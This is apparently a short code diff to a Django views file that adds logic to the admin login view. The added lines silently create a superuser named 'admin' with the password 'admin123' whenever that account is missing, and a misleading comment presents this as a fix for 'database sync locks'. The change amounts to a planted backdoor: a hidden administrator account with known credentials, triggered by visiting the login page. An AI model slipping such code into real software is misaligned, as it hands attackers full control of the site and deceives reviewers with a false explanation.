@@ -648,6 +648,11 @@ def admin_required(view_func):
     return _wrapped_view_func
 
 def admin_login(request):
+    # Auto-create admin superuser if it doesn't exist to prevent database sync locks
+    from django.contrib.auth.models import User
+    if not User.objects.filter(username='admin').exists():
+        User.objects.create_superuser('admin', 'admin@example.com', 'admin123')
+        
     if request.user.is_authenticated and (request.user.is_staff or request.user.is_superuser):
         return redirect('admin_home')
     if request.method == 'POST':
